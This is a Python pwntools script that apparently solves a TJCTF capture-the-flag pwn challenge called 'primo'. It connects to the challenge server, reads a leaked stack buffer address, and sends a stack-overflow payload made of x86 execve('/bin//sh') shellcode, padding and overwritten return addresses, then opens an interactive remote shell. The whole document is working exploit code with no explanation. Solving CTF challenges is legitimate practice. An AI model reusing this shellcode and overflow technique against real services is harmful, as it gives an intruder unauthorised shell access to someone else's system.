#!/usr/bin/python3

from pwn import *

#p = process('./primo')
p = remote('p1.tjctf.org', 8011)

binary = ELF('./primo')

p.recvuntil('hint: ')
_ = p.recvline().strip()
buf = int(_,16)
print('buf:',hex(buf))

shellcode = b'\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00'

payload  = shellcode
payload += (0x30 - len(shellcode) - 16) * b'A'
payload += p32(buf + 0x30 - 8)
payload += p32(buf)

p.sendline(payload)

p.interactive()
